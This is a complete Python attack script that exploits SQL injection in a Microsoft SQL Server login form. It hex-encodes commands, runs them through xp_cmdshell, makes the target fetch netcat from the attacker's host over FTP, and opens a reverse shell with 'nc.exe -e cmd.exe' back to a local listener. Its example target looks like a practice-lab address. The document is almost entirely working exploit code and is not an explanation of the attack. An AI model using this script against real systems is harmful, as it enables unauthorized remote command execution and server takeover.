#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################################
#█▀▄▀█    ▄▄▄▄▄    ▄▄▄▄▄    ▄▄ █ █         ▄  █ ▄▄  ▄█▄    █▀▄▀█ ██▄      ▄▄▄▄▄    ▄  █ ▄███▄   █    █    █▄▄▄▄ ▄█▄    ▄███▄   #
#█ █ █   █     ▀▄ █     ▀▄ █   █ █     ▀▄   █ █   █ █▀ ▀▄  █ █ █ █  █    █     ▀▄ █   █ █▀   ▀  █    █    █  ▄▀ █▀ ▀▄  █▀   ▀  #
#█ ▄ █ ▄  ▀▀▀▀▄ ▄  ▀▀▀▀▄    ▀▀▀█ █       █ ▀  █▀▀▀  █   ▀  █ ▄ █ █   █ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █    █▀▀▌  █   ▀  ██▄▄    #
#█   █  ▀▄▄▄▄▀   ▀▄▄▄▄▀        █ ███▄   ▄ █   █     █▄  ▄▀ █   █ █  █   ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄ █  █  █▄  ▄▀ █▄   ▄▀ #
#█                           █    ▀ █   ▀▄  █    ▀███▀     █  ███▀                █  ▀███▀       ▀    ▀  █   ▀███▀  ▀███▀      #
#▀                             ▀      ▀       ▀            ▀                      ▀                      ▀                     #
#                                                                                                                              #
# DATE                                                                                                                         #
# 17/07/2018                                                                                                                   #
#                                                                                                                              #
# DESCRIPTION                                                                                                                  #
# Abuse xp_cmdshell in mssql in sql injection to pop shell                                                                     #
#                                                                                                                              #
# nighter - http://nighter.se/                                                                                                 #
#                                                                                                                              #
################################################################################################################################

import requests
import sys, urllib as ul
import binascii
import os
import re
import time

from multiprocessing import Process


def prepare_payload():

    if os.path.isfile('./.nc.exe') is False:
        print("[-] netcat payload not found.")
        sys.exit(0)

    os.system('cp ./.nc.exe /tmp/nc.exe 2>/dev/null')
    if os.path.isfile('/tmp/nc.exe') is False:
        print("[-] prepare netcat payload failed.")
        sys.exit(0)


def sqli_rce(command, pattern):

    _command = "0x%s" % binascii.hexlify(command)

    try:
        _pre = pattern.split('^')[0]
    except:
        _pre = ''

    try:
        _end = pattern.split('^')[2]
    except:
        _end = ''

    _url = URL.split('[')[0]

    session = requests.Session()
    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
               'Content-Type': 'application/x-www-form-urlencoded'}

    data = "';DECLARE @bzfp VARCHAR(8000);SET @bzfp=%s;EXEC master..xp_cmdshell @bzfp--" % _command
    data_encoded = _pre + ul.quote_plus(data).replace('+', '%20') + _end

    r = session.post('%s' % _url, data=data_encoded, headers=headers)
    print(r.text)


def start_ftp_server():
    os.chdir('/tmp')
    os.system("python3 -m pyftpdlib -p 21")


def exploit():

    result = re.search('\[(.*)\]', URL)
    pattern = result.group(1)

    # Upload payload over FTP
    sqli_rce('echo open %s 21> ftp.txt' % LHOST, pattern)
    sqli_rce('echo USER anonymous>> ftp.txt', pattern)
    sqli_rce('echo bin >> ftp.txt', pattern)
    sqli_rce('echo GET nc.exe >> ftp.txt', pattern)
    sqli_rce('echo bye >> ftp.txt', pattern)
    sqli_rce('ftp -v -n -s:ftp.txt', pattern)

    time.sleep(2)
    sqli_rce('nc.exe %s %s -e cmd.exe' % (LHOST, LPORT), pattern)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
• ▌ ▄ ·. .▄▄ · .▄▄ · .▄▄▄  ▄▄▌  ▐▄• ▄  ▄▄▄· ▄▄· • ▌ ▄ ·. ·▄▄▄▄  .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▐█ ▀. ▐█ ▀. ▐▀•▀█ ██•   █▌█▌▪▐█ ▄█▐█ ▌▪·██ ▐███▪██▪ ██ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█·▄▀▀▀█▄▄▀▀▀█▄█▌·.█▌██▪   ·██·  ██▀·██ ▄▄▐█ ▌▐▌▐█·▐█· ▐█▌▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▪▄█·▐█▌▐▌▪▐█·█▌▐█▪·•▐███▌██ ██▌▐█▌██. ██ ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀▀▀▀  ▀▀▀▀ ·▀▀█. .▀▀▀ •▀▀ ▀▀.▀   ·▀▀▀ ▀▀  █▪▀▀▀▀▀▀▀▀•  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀  ▀·▀▀▀  ▀▀▀ 
[mssql pop shell with xp_cmdshell in sql injection.]
    """)
        print("Usage: %s <URL|[txtLoginID=sa&txtPassword=password^INJECT^&cmdSubmit=Login]> <LHOST> <LPORT>" % (sys.argv[0]))
        print("\nEXAMPLE: ./mssql_xpcmdshell_sqli.py http://10.10.10.59/login-off.asp[txtLoginID=sa&txtPassword=password^INJECT^&cmdSubmit=Login] 10.10.14.24 1337\n")
        sys.exit(0)

    URL = sys.argv[1]

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)

    prepare_payload()
    p = Process(target=start_ftp_server)
    p.start()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)
